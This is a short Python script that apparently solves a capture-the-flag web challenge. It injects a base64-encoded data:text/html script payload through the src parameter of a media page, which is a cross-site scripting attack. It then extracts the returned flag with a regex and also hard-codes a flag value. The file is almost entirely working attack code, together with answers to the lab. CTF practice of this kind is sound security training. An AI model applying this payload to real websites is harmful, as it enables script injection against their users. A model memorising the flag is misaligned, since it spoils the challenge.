import base64
import re

import requests
from constants import FLAG_REGEX, TIMEOUT, URL
from flag_11 import PICTURE_FILENAME


FLAG14 = "155e9df696c8358925dab8523eedd450"

MEDIA_URL = f"{URL}/?page=media"


def main() -> None:
    url = f"{MEDIA_URL}&src=data:text/html;base64,"
    url += base64.b64encode(
        f"<script>alert('{PICTURE_FILENAME}')</script>".encode()
    ).decode()
    response = requests.get(url, timeout=TIMEOUT)

    if (match := re.search(FLAG_REGEX, response.text)) is None:
        raise ValueError()

    flag = match.group(1)
    print(flag)


if __name__ == "__main__":
    main()
